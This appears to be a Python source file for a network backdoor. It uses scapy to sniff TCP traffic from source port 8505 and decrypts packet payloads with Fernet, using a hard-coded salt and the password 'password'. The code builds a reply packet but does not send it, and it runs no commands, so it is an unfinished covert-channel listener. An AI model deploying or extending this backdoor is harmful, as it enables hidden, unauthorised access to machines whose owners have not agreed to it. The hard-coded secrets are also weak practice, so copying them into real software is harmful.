import base64
from scapy.all import *
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


def backdoor_packet_handler(pkt):
    print("pkt_handler")
    print(pkt)
    if TCP in pkt and pkt[TCP].sport==8505:
        print(decrypt(pkt.load, b"password"))
        response = IP(dst=pkt[IP].src)/TCP(dport=pkt[TCP].sport)/pkt.load

# ----------------------------------------------------------------------------------------------------------------------
# The encrypt function takes in a message and encrypts using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# hiddenMsg - the plaintext to be encrypted (in bytes)
# password - the password used to encrypt the message (in bytes)
#
# Returns:
# encrypt returns an array of bytes that represents the encrypted message
# ----------------------------------------------------------------------------------------------------------------------
def encrypt(hiddenMsg, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    token = encrypter.encrypt(hiddenMsg)
    return token

# ----------------------------------------------------------------------------------------------------------------------
# The decrypt function takes in ciphertext and decrypts it using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# ciphertext - the ciphertext to be decrypted (in bytes)
# password - the password used to decrypt the message (in bytes)
#
# Returns:
# decrypt returns an array of bytes that represents the decrypted message
# ----------------------------------------------------------------------------------------------------------------------
def decrypt(cipherText, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    return encrypter.decrypt(cipherText)


#Actual run code
print("Starting")
sniff(prn=backdoor_packet_handler, filter="tcp and src port 8505", store=0)
